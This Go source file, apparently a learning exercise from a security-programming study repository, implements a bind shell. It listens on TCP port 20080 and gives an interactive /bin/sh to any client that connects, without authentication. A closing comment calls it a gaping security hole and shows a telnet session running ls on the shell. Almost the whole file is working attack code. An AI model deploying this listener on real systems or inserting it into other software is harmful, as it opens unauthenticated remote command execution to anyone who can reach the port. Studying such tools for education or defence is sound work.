package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}

/*

Any remote client that connects, perhaps via Telnet, would be
able to execute arbitrary bash commands—hence the reason
this is referred to as a gaping security hole. Netcat allows you
to optionally include this feature during program compilation.
================================================================
telnet localhost 20080
Trying ::1...
Connected to localhost.
Escape character is '^]'.
ls
blackhatgo
deneme
GolangBasics
GolangCleanCode
GolangConcurrency
GolangTesting
GolangWebDevelopment
img
LICENSE
README.md

*/
